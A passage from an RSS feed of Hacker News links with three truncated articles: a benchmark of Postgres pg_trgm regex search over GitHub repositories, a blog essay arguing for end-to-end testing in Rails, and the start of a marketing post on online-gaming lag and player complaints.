  <li>Removing files &gt; 1 MiB resulted in another 51% reduction (290G -&gt; 142G, for 12,148 repositories - note GitHub does not index files &gt; 384 KiB in their search engine)</li>
</ul>

<h2 id="database-insertion">Database insertion</h2>

<p>We <a href="https://github.com/hexops/pgtrgm_emperical_measurements/blob/main/cmd/corpusindex/main.go">concurrently inserted</a> the entire corpus into Postgres, with the following DB schema:</p>

<div><div><pre><code><span>CREATE</span> <span>EXTENSION</span> <span>IF</span> <span>NOT</span> <span>EXISTS</span> <span>pg_trgm</span><span>;</span>
<span>CREATE</span> <span>TABLE</span> <span>IF</span> <span>NOT</span> <span>EXISTS</span> <span>files</span> <span>(</span>
    <span>id</span> <span>bigserial</span> <span>PRIMARY</span> <span>KEY</span><span>,</span>
    <span>contents</span> <span>text</span> <span>NOT</span> <span>NULL</span><span>,</span>
    <span>filepath</span> <span>text</span> <span>NOT</span> <span>NULL</span>
<span>);</span>
</code></pre></div></div>

<p>In total, this took around ~8 hours to complete and Postgres’s entire on-disk utilization was 101G.</p>

<h2 id="creating-the-trigram-index">Creating the Trigram index</h2>

<p>We tried three separate times to index the dataset using the following GIN Trigram index:</p>

<div><div><pre><code>CREATE INDEX IF NOT EXISTS files_contents_trgm_idx ON files USING GIN (contents gin_trgm_ops);
</code></pre></div></div>

<ul>
  <li><strong>In the first attempt, we hit an OOM after 11 hours and 34 minutes.</strong> This was due to a rapid spike in memory usage at the very end of indexing. We used a <a href="https://github.com/hexops/pgtrgm_emperical_measurements#configuration-attempt-1-indexing-failure-oom">fairly aggressive</a> Postgres configuration with a very large max WAL size, so it was not entirely unexpected.</li>
  <li><strong>In the second attempt, we ran out of SSD disk space after ~27 hours</strong>. Notable is that the disk space largely grew towards the end of indexing, similar to when we faced an OOM - it was not a gradual increase over time. For this attempt, we used the excellent <a href="https://pgtune.leopard.in.ua/#/">pgtune</a> tool to reduce our first Postgres configuration as follows:</li>
</ul>

<div><div><pre><code>shared_buffers = 4GB → 2560MB
effective_cache_size = 12GB → 7680MB
maintenance_work_mem = 16GB → 1280MB
default_statistics_target = 100 → 500
work_mem = 5242kB → 16MB
min_wal_size = 50GB → 4GB
max_wal_size = 4GB → 16GB
max_parallel_workers_per_gather = 8 → 4
max_parallel_maintenance_workers = 8 → 4
</code></pre></div></div>
<ul>
  <li><strong>In our third and final attempt, we cut the dataset in half and indexing succeeded after 22 hours.</strong> In specific, we deleted half of the files in the database (from 19,441,820 files / 178GiB of data to 9,720,910 files / 82 GiB of data.) The Postgres configuration used was the same as in attempt 2.</li>
</ul>

<h2 id="indexing-performance-memory-usage">Indexing performance: Memory usage</h2>

<p>In our first attempt, we see the reported <code>docker stats</code> memory usage of the container grow up to 12 GiB (chart shows MiB of memory used over time):</p>

<p><img width="981" alt="image" src="https://user-images.githubusercontent.com/3173176/107313722-56bbac80-6a50-11eb-94c7-8e13ea095053.png"></p>

<p>In our second and third attempts, we see far less memory usage (~1.6 GiB consistently):</p>

<p><img width="980" alt="image" src="https://user-images.githubusercontent.com/3173176/107314104-350ef500-6a51-11eb-909f-2f1b524d29b2.png"></p>

<p><img width="980" alt="image" src="https://user-images.githubusercontent.com/3173176/107315387-ce3f0b00-6a53-11eb-886c-410f000f73bd.png"></p>

<h2 id="indexing-performance-cpu-usage">Indexing performance: CPU usage</h2>

<p>Postgres’ Trigram indexing appears to be mostly single-threaded (at least when indexing <em>a single table</em>, we test multiple tables later.)</p>

<p>In our first attempt, CPU usage for the container did not rise above 156% (one and a half virtual CPU cores):</p>

<p><img width="982" alt="image" src="https://user-images.githubusercontent.com/3173176/107313915-cc277d00-6a50-11eb-9282-62159a127966.png"></p>

<p>Our second attempt was around 150-200% CPU usage on average:</p>

<p><img width="980" alt="image" src="https://user-images.githubusercontent.com/3173176/107314168-507a0000-6a51-11eb-8a18-ec18752f7f16.png"></p>

<p>Our third attempt similarly saw an average of 150-200%, but with a brief spike towards the end to ~350% CPU:</p>

<p><img width="980" alt="image" src="https://user-images.githubusercontent.com/3173176/107315239-8324f800-6a53-11eb-9a5b-fcc61d1a7b59.png"></p>

<h2 id="indexing-performance-disk-io">Indexing performance: Disk IO</h2>

<p>Disk reads/writes during indexing averaged about ~250 MB/s for reads (blue) and writes (red). Native in-software tests show the same Macbook able to achieve read/write speeds of ~860 MB/s with &lt;5% affect on CPU utilization.</p>

<p><small>Addition made Feb 20, 2021:</small> We ran tests using native Postgres as well (instead of in Docker with a bind mount) and found better indexing and query performance, more on this below.</p>

<p><img width="599" alt="image" src="https://user-images.githubusercontent.com/3173176/106507903-ec6f9e80-6488-11eb-88a8-78e5b7aacfd6.png"></p>

<h2 id="indexing-performance-disk-space">Indexing performance: Disk space</h2>

<p>The database contains 9,720,910 files totalling 82.07 GiB:</p>

<div><div><pre><code>postgres=# select count(filepath) from files;
  count  
---------
 9720910
(1 row)

postgres=# select SUM(octet_length(contents)) from files;
     sum     
-------------
 88123563320
(1 row)
</code></pre></div></div>

<p><strong>Before indexing</strong>, we find that all of Postgres is consuming 54G:</p>

<div><div><pre><code>$ du -sh .postgres/
 54G	.postgres/
</code></pre></div></div>

<p>After <code>CREATE INDEX</code>, Postgres uses:</p>

<div><div><pre><code>$ du -sh .postgres/
 73G	.postgres/
</code></pre></div></div>

<p>Thus, the index size for 82 GiB of text is 19 GiB (or 23% of the data size.)</p>

<h2 id="database-startup-times">Database startup times</h2>

<p>From an operational standpoint, it is worth noting that if Postgres is starting clean (i.e. previous shutdown was graceful) then startup time is almost instantaneous: it begins accepting connections immediately and loads the index as needed.</p>

<p>However, if Postgres experienced a non-graceful termination during e.g. startup, it can take a hefty ~10 minutes with this dataset to start as it goes through an automated recovery process.</p>

<h2 id="queries-executed">Queries executed</h2>

<p>In total, we executed 19,936 search queries against the index. We chose queries which we expect give reasonably varying amounts of coverage over the trigram index (that is, queries whose trigrams are more or less likely to occur in many files):</p>

<table>
  <thead>
    <tr>
      <th>Regexp query</th>
      <th>Matching # files in entire dataset</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><code>var</code></td>
      <td>unknown (2m+ suspected)</td>
    </tr>
    <tr>
      <td><code>error</code></td>
      <td>1,479,452</td>
    </tr>
    <tr>
      <td><code>123456789</code></td>
      <td>59,841</td>
    </tr>
    <tr>
      <td><code>fmt\.Error</code></td>
      <td>127,895</td>
    </tr>
    <tr>
      <td><code>fmt\.Println</code></td>
      <td>22,876</td>
    </tr>
    <tr>
      <td><code>bytes.Buffer</code></td>
      <td>34,554</td>
    </tr>
    <tr>
      <td><code>fmt\.Print.*</code></td>
      <td>37,319</td>
    </tr>
    <tr>
      <td><code>ac8ac5d63b66b83b90ce41a2d4061635</code></td>
      <td>0</td>
    </tr>
    <tr>
      <td><code>d97f1d3ff91543[e-f]49.8b07517548877</code></td>
      <td>0</td>
    </tr>
  </tbody>
</table>

<details>
<summary>Detailed breakdown</summary>
<div>

    <table>
      <thead>
        <tr>
          <th>Query</th>
          <th>Result Limit</th>
          <th>Times executed</th>
        </tr>
      </thead>
      <tbody>
        <tr>
          <td><code>var</code></td>
          <td>10</td>
          <td>1000</td>
        </tr>
        <tr>
          <td><code>var</code></td>
          <td>100</td>
          <td>1000</td>
        </tr>
        <tr>
          <td><code>var</code></td>
          <td>1000</td>
          <td>100</td>
        </tr>
        <tr>
          <td><code>var</code></td>
          <td>unlimited</td>
          <td>4</td>
        </tr>
        <tr>
          <td><code>error'</code></td>
          <td>10</td>
          <td>2000</td>
        </tr>
        <tr>
          <td><code>error'</code></td>
          <td>100</td>
          <td>2000</td>
        </tr>
        <tr>
          <td><code>error'</code></td>
          <td>1000</td>
          <td>200</td>
        </tr>
        <tr>
          <td><code>error'</code></td>
          <td>unlimited</td>
          <td>18</td>
        </tr>
        <tr>
          <td><code>123456789</code></td>
          <td>10</td>
          <td>1000</td>
        </tr>
        <tr>
          <td><code>123456789</code></td>
          <td>100</td>
          <td>1000</td>
        </tr>
        <tr>
          <td><code>123456789</code></td>
          <td>1000</td>
          <td>100</td>
        </tr>
        <tr>
          <td><code>123456789</code></td>
          <td>unlimited</td>
          <td>2</td>
        </tr>
        <tr>
          <td><code>fmt\.Error</code></td>
          <td>10</td>
          <td>1000</td>
        </tr>
        <tr>
          <td><code>fmt\.Error</code></td>
          <td>100</td>
          <td>1000</td>
        </tr>
        <tr>
          <td><code>fmt\.Error</code></td>
          <td>1000</td>
          <td>100</td>
        </tr>
        <tr>
          <td><code>fmt\.Error</code></td>
          <td>unlimited</td>
          <td>2</td>
        </tr>
        <tr>
          <td><code>fmt\.Println</code></td>
          <td>10</td>
          <td>1000</td>
        </tr>
        <tr>
          <td><code>fmt\.Println</code></td>
          <td>100</td>
          <td>1000</td>
        </tr>
        <tr>
          <td><code>fmt\.Println</code></td>
          <td>1000</td>
          <td>100</td>
        </tr>
        <tr>
          <td><code>fmt\.Println</code></td>
          <td>unlimited</td>
          <td>2</td>
        </tr>
        <tr>
          <td><code>bytes.Buffer</code></td>
          <td>10</td>
          <td>4</td>
        </tr>
        <tr>
          <td><code>bytes.Buffer</code></td>
          <td>100</td>
          <td>4</td>
        </tr>
        <tr>
          <td><code>bytes.Buffer</code></td>
          <td>1000</td>
          <td>4</td>
        </tr>
        <tr>
          <td><code>bytes.Buffer</code></td>
          <td>unlimited</td>
          <td>2</td>
        </tr>
        <tr>
          <td><code>fmt\.Print.*</code></td>
          <td>10</td>
          <td>1000</td>
        </tr>
        <tr>
          <td><code>fmt\.Print.*</code></td>
          <td>100</td>
          <td>1000</td>
        </tr>
        <tr>
          <td><code>fmt\.Print.*</code></td>
          <td>1000</td>
          <td>100</td>
        </tr>
        <tr>
          <td><code>fmt\.Print.*</code></td>
          <td>unlimited</td>
          <td>2</td>
        </tr>
        <tr>
          <td><code>ac8ac5d63b66b83b90ce41a2d4061635</code></td>
          <td>10</td>
          <td>1000</td>
        </tr>
        <tr>
          <td><code>ac8ac5d63b66b83b90ce41a2d4061635</code></td>
          <td>100</td>
          <td>1000</td>
        </tr>
        <tr>
          <td><code>ac8ac5d63b66b83b90ce41a2d4061635</code></td>
          <td>1000</td>
          <td>100</td>
        </tr>
        <tr>
          <td><code>ac8ac5d63b66b83b90ce41a2d4061635</code></td>
          <td>unlimited</td>
          <td>2</td>
        </tr>
        <tr>
          <td><code>d97f1d3ff91543[e-f]49.8b07517548877</code></td>
          <td>10</td>
          <td>1000</td>
        </tr>
        <tr>
          <td><code>d97f1d3ff91543[e-f]49.8b07517548877</code></td>
          <td>100</td>
          <td>1000</td>
        </tr>
        <tr>
          <td><code>d97f1d3ff91543[e-f]49.8b07517548877</code></td>
          <td>1000</td>
          <td>100</td>
        </tr>
        <tr>
          <td><code>d97f1d3ff91543[e-f]49.8b07517548877</code></td>
          <td>unlimited</td>
          <td>2</td>
        </tr>
      </tbody>
    </table>

  </div>
</details>

<h2 id="query-performance">Query performance</h2>

<p>In total, we executed 19,936 search queries against the database (linearly, not in parallel) which completed in the following times:</p>

<table>
  <thead>
    <tr>
      <th>Time bucket</th>
      <th>Percentage of queries</th>
      <th>Number of queries</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Under 50ms</td>
      <td>30%</td>
      <td>5,933</td>
    </tr>
    <tr>
      <td>Under 250ms</td>
      <td>41%</td>
      <td>8,088</td>
    </tr>
    <tr>
      <td>Under 500ms</td>
      <td>52%</td>
      <td>10,275</td>
    </tr>
    <tr>
      <td>Under 750ms</td>
      <td>63%</td>
      <td>12,473</td>
    </tr>
    <tr>
      <td>Under 1s</td>
      <td>68%</td>
      <td>13,481</td>
    </tr>
    <tr>
      <td>Under 1.5s</td>
      <td>74%</td>
      <td>14,697</td>
    </tr>
    <tr>
      <td>Under 3s</td>
      <td>79%</td>
      <td>15,706</td>
    </tr>
    <tr>
      <td>Under 25s</td>
      <td>79%</td>
      <td>15,708</td>
    </tr>
    <tr>
      <td>Under 30s</td>
      <td>99%</td>
      <td>19,788</td>
    </tr>
  </tbody>
</table>

<h2 id="query-performance-vs-planning-time">Query performance vs. planning time</h2>

<p>The following scatter plot shows how 79% of queries executed in under 3s (Y axis, in ms), while Postgres’s query planner had planned them for execution in under 100-250ms generally (X axis, in ms):</p>

<p><img width="1252" alt="image" src="https://user-images.githubusercontent.com/3173176/107848471-ef379100-6db0-11eb-8396-4d156a179aae.png"></p>

<p>If we expand the view to include all queries, we start to get a picture of just how outlier these 21% of queries are (note that the small block of dots in the bottom left represents the same diagram shown above):</p>

<p><img width="1250" alt="image" src="https://user-images.githubusercontent.com/3173176/107848517-3cb3fe00-6db1-11eb-9652-e65d7d88fe36.png"></p>

<h2 id="query-time-vs-cpu--memory-usage">Query time vs. CPU &amp; Memory usage</h2>

<p>The following image shows:</p>

<ul>
  <li>(top) Query time in milliseconds</li>
  <li>(middle) CPU usage percentage (e.g. 801% refers to 8 out of 16 virtual CPU cores being consumed)</li>
  <li>(bottom) Memory usage in MiB.</li>
</ul>

<p><img width="1255" alt="image" src="https://user-images.githubusercontent.com/3173176/107848716-efd12700-6db2-11eb-8e8b-a8141a6bdb0b.png"></p>

<p>Notable insights from this are:</p>

<ul>
  <li>The large increase in resource usage towards the end is when we began executing queries with no <code>LIMIT</code>.</li>
  <li>CPU usage does not exceed 138%, until the spike at the end.</li>
  <li>Memory usage does not exceed 42 MiB, until the spike at the end.</li>
</ul>

<p>We suspect <code>pg_trgm</code> is single-threaded within the scope of a single table, but with <a href="https://www.postgresql.org/docs/10/ddl-partitioning.html">table data partitioning</a> (or splitting data into multiple tables with subsets of the data), we suspect better parallelism could be achieved.</p>

<h2 id="investigating-slow-queries">Investigating slow queries</h2>

<p>If we plot the number of index rechecks (X axis) vs. execution time (Y axis), we can clearly see one of the most significant aspects of slow queries is that they have many more index rechecks:</p>

<p><img width="1036" alt="image" src="https://user-images.githubusercontent.com/3173176/107849660-fc0cb280-6db9-11eb-9c10-cb7e74366ab7.png"></p>

<p>And if we look at <a href="https://github.com/hexops/pgtrgm_emperical_measurements/blob/main/query_logs/query-run-3.log#L3-L24">the <code>EXPLAIN ANALYZE</code> output for one of these queries</a> we can also confirm <code>Parallel Bitmap Heap Scan</code> is slow due to <code>Rows Removed by Index Recheck</code>.</p>

<h2 id="table-splitting">Table splitting</h2>

<p>Splitting up the search index into multiple smaller tables seems like an obvious approach to getting <code>pg_trgm</code> to use multiple CPU cores. We tried this by taking the same exact data set and splitting it into 200 tables, and found …</p></div></article></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://devlog.hexops.com/2021/postgres-regex-search-over-10000-github-repositories">https://devlog.hexops.com/2021/postgres-regex-search-over-10000-github-repositories</a></em></p>]]>
            </description>
            <link>https://devlog.hexops.com/2021/postgres-regex-search-over-10000-github-repositories</link>
            <guid isPermaLink="false">hacker-news-small-sites-26230879</guid>
            <pubDate>Mon, 22 Feb 2021 21:26:58 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The How and Why of End-to-End Testing]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26230422">thread link</a>) | @jasonfb
<br/>
February 22, 2021 | https://blog.jasonfleetwoodboldt.com/2021/02/22/the-how-and-why-of-end-to-end-testing/ | <a href="https://web.archive.org/web/*/https://blog.jasonfleetwoodboldt.com/2021/02/22/the-how-and-why-of-end-to-end-testing/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

		<div>

			
<p>Perhaps the most significant and under-appreciated aspect of Rails&nbsp;<em>and</em>&nbsp;Agile software development of the last roughly 15 years is the culture and discipline around&nbsp;<strong>testing</strong>&nbsp;and&nbsp;<strong>test-driven development</strong>.</p>



<p>I’ve never come to understand why testing and TDD is often maligned by the loudest, most vocal developers:&nbsp;<strong><em>It’s too slow, it takes longer, the boss didn’t want or ask for it,&nbsp;</em></strong>they’ll say.</p>



<p>You don’t hear about these developers or this ideology often in professional circles, but you encounter them quickly in the wild west of freelance development.</p>



<p><strong>[SEIZURE WARNING: There is an animated GIF towards the bottom of this page that flashes. Please disable animated GIFs if you are susceptible to flashing lights.]</strong></p>



<p>Indeed, much of the popular and discussed rhetoric in the community of Rails is about a codebase’s test suite (a suite of tests for your whole application, this collective is called “the tests” or “the specs”): How much of your codebase is covered (as measured in %, which I discuss further below)? How easy are the tests to write? Do they use factories or fixtures? How brittle are they? Do they test the right things and are they valuable?</p>



<p>All of these are correct questions. Although there is no substitute for the day-in-day-out practice of this to become great at testing, I will try to offer some broad ‘best practice’ answers to these questions.</p>



<p>The enlightened developers don’t ask or care about whether or not the boss told us to write a tested codebase. We just know the answers to the above questions and do what’s right for the codebase: write specs.</p>



<p>Testing has varying degrees, varying methods, varying strengths.</p>



<p>In&nbsp;<a href="https://sandimetz.com/99bottles"><em>99 Bottles of OOP</em></a>, Metz, Owen, and Stankus make this interesting observation:</p>



<blockquote><p>Belief in the value of TDD has become mainstream, and the pressure to follow this practice approaches an unspoken mandate. Acceptance of this mandate is illustrated by the fact that it’s common for folks who don’t test to tender sheepish apologies. Even those who don’t test seem to believe they ought to do so.</p><cite>(Metz, et al, 99 Bottles of OOP, Second Edition, 2020. p 43)</cite></blockquote>



<p>So testing exists in a murky space: The top dev shops and teams know it is essential, but its implementation is inconsistent. Sadly, I’ve seen lots of development happen where people either just don’t write tests, write tests blindly, use tests as a cudgel, or skip end-to-end testing altogether.</p>



<p>Many years in this industry have led me to what seems like an extreme position.&nbsp;<strong>Not writing tests should be seen as akin to malpractice in software development. Hiring someone to write untested code should be outlawed.</strong></p>



<p>Having a tested codebase is absolutely the most significant benchmark in producing quality software today. If you are producing serious application development but you don’t have tests, you have already lost.</p>



<p>Having a good test suite is not only the&nbsp;<strong>benchmark of quality</strong>, it means that you can&nbsp;<strong>refactor with confidence</strong>.</p>



<p>There are two kinds of tests you should learn and write:</p>



<ul><li><strong>Unit testing&nbsp;</strong>(also called model testing or black-box testing)</li><li><strong>End-to-end testing&nbsp;</strong>(also called integration testing, feature testing, or system tests)</li></ul>



<p>These go by different names. Focus on the how and why of testing and don’t get lost in the implementation details of the different kinds of tests. (To learn to do testing in Ruby, you can check out <a href="https://blog.jasonfleetwoodboldt.com/courses/stepping-up-rails/">my course</a> where I go over all the details.)</p>







<p><strong>Unit tests&nbsp;</strong>are the “lowest-level” tests. In unit testing, we are testing only one single unit of code: Typically for Rails, a model. When we talk about Unit testing in other languages, it means the same as it does for Rails, but might be applied in other contexts.</p>



<p><strong>The thing you are testing is a black box. In your test, you will give your black box some inputs, tell it to do something, and assert that a specific output has been produced. The internals (implementation details) of the black box should not be known to your unit test.</strong></p>



<p>This fundamental tenet of unit testing is probably one of the single most commonly repeated axioms of knowledge in software development today.</p>



<p>The way to miss the boat here (unfortunately) is to follow the axiom strictly but misunderstand&nbsp;<em>why</em>&nbsp;you are doing it.</p>



<p>Testing, and especially learning to practice test-<em>driven</em>&nbsp;development (that’s when you force yourself&nbsp;<strong>not</strong>&nbsp;to write any code unless you write a test&nbsp;<strong>first</strong>), is in fact a lot deeper and more significant than just about quality, refactoring, and black boxes. (Although if you’ve learned that much by now you’re on the right track.)</p>



<p>Most people think that software, especially web software, is written once and then done. This is a fallacy: Any serious piece of software today is iterated and iterated. Even if you are writing an application for rolling out all at once, on the web there should always be a feedback loop.</p>



<p>Perhaps one of the worst and most problematic anti-patterns I’ve ever seen is when contractors write code, it is deployed, and nobody ever looks at any error logs. Or any stack-traces. Or even at the database records. (Typically this happens less in the context of companies hiring employees because employees tend to keep working for your company on an ongoing basis whereas contractors tend to ‘deliver’ the product and then leave.)</p>



<p>It’s not just about “catching a bug’” here or there. Or tweaking or modifying the software once it’s live. (Which, to be fair, most developers don’t actually like to do.)</p>



<p><strong>It’s about the fact that once it is live, anything and everything can and will happen. As a result, the data in your data stores might get into all kinds of states you weren’t expecting.</strong>&nbsp;Or maybe someone visits your website in a browser that doesn’t support the Javascript syntax you used. Or maybe&nbsp;<em>this</em>, or maybe&nbsp;<em>that</em>. It’s always&nbsp;<em>something</em>.</p>



<p>This is&nbsp;<strong>the marriage of testing &amp; ‘real life’</strong>: You want your tests to be ‘as isolated’ as possible, yet at the same time ‘as realistic’ as they&nbsp;<em>need</em>&nbsp;to be in order to anticipate what your users will experience.</p>



<p>That’s the right balance. Your code doesn’t exist in a vacuum, and the test environment is only a figment of your imagination. The unit test is&nbsp;<strong><em>valuable</em></strong>&nbsp;to you because it is as realistic as it needs to be to mimic what will happen to your app in the real, wild world of production.</p>



<p><strong>With unit testing, you aren’t actually putting the whole application through its places: You’re just testing one unit against a set of assertions.</strong></p>



<p>In the wild (that is, real live websites), all kinds of chaos happens. Your assumptions that&nbsp;<em>user_id</em>&nbsp;would never be&nbsp;<em>nil</em>, for example, proves out not to be the case in one small step of the workflow because the user hasn’t been assigned yet. (Stop me if you’ve heard this one before.)</p>



<p>You never wrote a spec for the user_id being nil, because you assumed that that could never happen. Well, it did. Or rather, it might.</p>



<p><strong><em>Many developers, especially the ones with something to prove, get too focused on unit testing.</em></strong>&nbsp;For one thing, they use the&nbsp;<em>percentage of codebase covered</em>&nbsp;as a badge of honor.</p>



<h2 id="5a3c">Percentage of Codebase Covered</h2>



<p>When you run your tests, a special tool called a coverage reporter can scan the lines of code in your application to determine if that line of code was run through during your test. It shows you which lines got the test to run over them and which lines were ‘missed.’</p>



<p>It doesn’t tell you if your test was correct, that it asserted the correct thing of course. It just tells you where you’ve missed lines of code. The typical benchmark for a well-tested Rails application is about 85–95% test coverage. (Because of various nuanced factors, there are always some files that you can’t or don’t need to test— typically not your application files.)</p>



<p>Here I use a tool in Ruby called&nbsp;<a href="https://rubygems.org/gems/simplecov-rcov">simplecov-rcov</a>&nbsp;to show which lines (precisely, line-by-line, and file-by-file) are covered. Here in this baby little project of mine, I have an unfortunate 36.55% of my codebase covered:</p>



<figure><img src="https://dzw5z73631yuc.cloudfront.net/wp-content/uploads/2021/02/22234926/Screen-Shot-2021-02-22-at-10.21.48-AM-1024x827.png" alt="example coverage report" srcset="https://dzw5z73631yuc.cloudfront.net/wp-content/uploads/2021/02/22234926/Screen-Shot-2021-02-22-at-10.21.48-AM-1024x827.png 1024w, https://dzw5z73631yuc.cloudfront.net/wp-content/uploads/2021/02/22234926/Screen-Shot-2021-02-22-at-10.21.48-AM-300x242.png 300w, https://dzw5z73631yuc.cloudfront.net/wp-content/uploads/2021/02/22234926/Screen-Shot-2021-02-22-at-10.21.48-AM-768x620.png 768w, https://dzw5z73631yuc.cloudfront.net/wp-content/uploads/2021/02/22234926/Screen-Shot-2021-02-22-at-10.21.48-AM.png 1091w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p>As you see, the files are sorted with the least covered files shown up top. The top files are in red and say “0.00 %” covered because the test suite does not go into that file.</p>



<p>When I click into the file, I can actually see which lines are covered and uncovered, in red &amp; green like so:</p>



<figure><img src="https://dzw5z73631yuc.cloudfront.net/wp-content/uploads/2021/02/22235012/Screen-Shot-2021-02-22-at-10.23.50-AM-1024x464.png" alt="Code coverage report showing an untested line of Ruby" srcset="https://dzw5z73631yuc.cloudfront.net/wp-content/uploads/2021/02/22235012/Screen-Shot-2021-02-22-at-10.23.50-AM-1024x464.png 1024w, https://dzw5z73631yuc.cloudfront.net/wp-content/uploads/2021/02/22235012/Screen-Shot-2021-02-22-at-10.23.50-AM-300x136.png 300w, https://dzw5z73631yuc.cloudfront.net/wp-content/uploads/2021/02/22235012/Screen-Shot-2021-02-22-at-10.23.50-AM-768x348.png 768w, https://dzw5z73631yuc.cloudfront.net/wp-content/uploads/2021/02/22235012/Screen-Shot-2021-02-22-at-10.23.50-AM.png 1042w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p>(Here’s a great example of that “it only happens in the wild” thing I was talking about earlier. In theory, I should never get passed a room id (params[:room]) that is not in my database [see line 4], but in practice, for some reason, while I was debugging I did. So I added a small little guard to catch for this while debugging, thus making the line of code inside the if statement uncovered by my test suite.)</p>



<p>Correlating the total percentage of test coverage to your code quality and/or value of the tests is often a fallacy:&nbsp;<em>Look at the percentage of codebase covered, but not every day.</em></p>



<p>The problem with over-emphasis on unit testing is the dirty little secret of unit testing:&nbsp;<strong>Unit tests rarely catch bugs.</strong></p>



<p>So why do we unit test at all then?&nbsp;<strong>Unit tests do catch all of your problems when you are upgrading.</strong></p>



<p><em>You should unit test your code for the following&nbsp;</em><strong><em>four</em></strong><em>&nbsp;reasons:</em></p>



<p>(1) It helps you think about and structure your code more consistently.</p>



<p>(2) It will help you produce cleaner, more easily reasoned code as you refactor.</p>



<p>(3) Refactoring will, in turn, reveal more about&nbsp;<strong><em>the form</em></strong>&nbsp;(or shape) of your application that you couldn’t realize upfront.</p>



<p>(4) Your unit tests will catch bugs quickly when you upgrade Rails.</p>



<p>That’s it. Notice that&nbsp;<strong><em>not listed here</em></strong>is ‘catching regressions’ (or bugs). That’s significant because many developers think unit testing cover all of their bases. Not only do they&nbsp;<strong>not</strong>&nbsp;cover all of your bases: They don’t even catch or prevent regressions (bugs) in live production apps very often.</p>



<p><strong>Testing is important. Unit testing and end-to-end testing are both important, but between the two, end-to-end testing is the most important of all.</strong></p>






</div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.jasonfleetwoodboldt.com/2021/02/22/the-how-and-why-of-end-to-end-testing/">https://blog.jasonfleetwoodboldt.com/2021/02/22/the-how-and-why-of-end-to-end-testing/</a></em></p>]]>
            </description>
            <link>https://blog.jasonfleetwoodboldt.com/2021/02/22/the-how-and-why-of-end-to-end-testing/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26230422</guid>
            <pubDate>Mon, 22 Feb 2021 20:51:19 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why It's a Mistake for Publishers to Treat Player Complaints as White Noise]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26230258">thread link</a>) | @ronwilliams821
<br/>
February 22, 2021 | https://www.subspace.com/blog/why-its-a-mistake-for-publishers-to-treat-player-complaints-as-white-noise | <a href="https://web.archive.org/web/*/https://www.subspace.com/blog/why-its-a-mistake-for-publishers-to-treat-player-complaints-as-white-noise">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div data-layout-label="Post Body" data-type="item" id="item-6033e69be3c69f170b958492"><div><div><div data-block-type="2" id="block-e9364474264d18dc38c6"><div><p><strong>TL;DR</strong></p><p><em>With the rise in online gaming popularity since the coronavirus pandemic forced people indoors, network issues like lag have resulted in an outpour of player complaints. Game publishers are now looking for solutions to avoid revenue loss, game abandonment, and community churn.</em></p><p><em>Estimated read time: 8 minutes</em></p><p>----------</p><p>The online game market has exploded over the last few years.</p><p>According to estimates, the <a href="https://newzoo.com/insights/articles/newzoo-games-market-numbers-revenues-and-audience-2020-2023/">video game market will hit $200 billion in revenue by 2023</a>.</p><p>The global pandemic has only escalated that growth by forcing people indoors, many of whom took up gaming to escape and connect with others globally.</p><p>As a result of increased internet traffic from more people logging on to play, network quality problems like lag continues to be a hot-button issue that many game publishers are struggling to figure out.</p><p><strong>This is resulting in players and gaming communities flooding to the internet to voice their complaints.</strong></p><p>As we will explore in this article, this can lead to many problems for game publishers, including game abandonment, community churn, and losses in revenue.</p><p>First, let’s talk about why lag is a huge problem when it comes to gaming.</p></div></div><div data-block-type="5" id="block-yui_3_17_2_1_1614014215234_9811"><div>








  

    
  
    <div data-test="image-block-inline-outer-wrapper">

      

      
        <figure>
          
        
        

        
          
            
          <p><img data-src="https://images.squarespace-cdn.com/content/v1/5e28bb4e630fb46e596e182c/1614014539752-DNF55GYI92A6VSCSYUAS/ke17ZwdGBToddI8pDm48kI_uL0Lu3YmDOWRp8GvCA6hZw-zPPgdn4jUwVcJE1ZvWEtT5uBSRWt4vQZAgTJucoTqqXjS3CfNDSuuf31e0tVFnmPBfss0IfMxxMBMhA9DNbDUNlGYSEAZNEHrX26nAypuG45vQwBxdpDrCGUSSl5w/lag.gif" data-image="https://images.squarespace-cdn.com/content/v1/5e28bb4e630fb46e596e182c/1614014539752-DNF55GYI92A6VSCSYUAS/ke17ZwdGBToddI8pDm48kI_uL0Lu3YmDOWRp8GvCA6hZw-zPPgdn4jUwVcJE1ZvWEtT5uBSRWt4vQZAgTJucoTqqXjS3CfNDSuuf31e0tVFnmPBfss0IfMxxMBMhA9DNbDUNlGYSEAZNEHrX26nAypuG45vQwBxdpDrCGUSSl5w/lag.gif" data-image-dimensions="478x432" data-image-focal-point="0.5,0.5" alt="lag.gif" data-load="false" data-image-id="6033e846e0310a4198fe84a3" data-type="image">
          </p>
        
          
        

        
      
        </figure>
      

    </div>
  


  


</div></div><div data-block-type="2" id="block-yui_3_17_2_1_1614014215234_11158"><div><h3>Why Lag Is Enemy #1 When it Comes To Gaming</h3><p>We can all agree that lag is a pain.</p><p>It’s a problem that haunts publishers and players alike.</p><p>On a micro scale, it can cause a single player to leave a game. On a macro scale, one player’s lag can negatively impact the quality of experience for multiple players, as noted in <a href="https://www.cs.montana.edu/techreports/1213/Howard.pdf">this study from Montana State University</a>.</p></div></div><div data-block-type="2" id="block-yui_3_17_2_1_1614014215234_19458"><div><p><strong>“The lag of just one player can cause a cascading impact on the Quality of Experience (QoE) of other players. … Having a group member lag decreases the experience for everyone. … Current lag mitigation techniques are not sufficient when dealing with this cascading impact and may actually be decreasing the overall QoE of the players.”&nbsp;</strong></p><p>- Montana State University Study on The Cascading Impact of Lag on User Experience in Cooperative Multiplayer Games</p></div></div><div data-block-type="2" id="block-yui_3_17_2_1_1614014215234_21686"><p>Since gaming’s popularity is on the rise, this topic has been studied in great detail. In a <a 